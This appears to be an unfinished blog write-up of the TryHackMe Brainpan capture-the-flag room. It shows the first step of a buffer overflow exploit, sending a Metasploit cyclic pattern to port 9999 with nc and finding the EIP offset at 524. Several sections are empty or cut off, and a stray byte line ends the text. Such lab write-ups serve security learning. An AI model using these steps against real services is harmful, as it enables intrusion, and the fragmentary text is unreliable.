---
layout: post
title:  "TryHackMe.com: Brainpan"
categories: write-up
author: tlabruyere
tags: [CTF, tryhackme]
---

# Recon

Get 

# RE 


## Overflow

Determine the locatation in the buffer where `EIP` crashed on by sending a unique reproducable random sstring and determining what value was in `EIP`. 

```bash
$ msf-pattern_create -l 1024 | nc $IP 9999
```

`eip` is 0x35724134

Looking the value of `eip` up in the cyclic buffer 

```bash
$ msf-pattern_offset -q 0x35724134
[*] Exact match at offset 524
```

This means the

f3 12 17 31
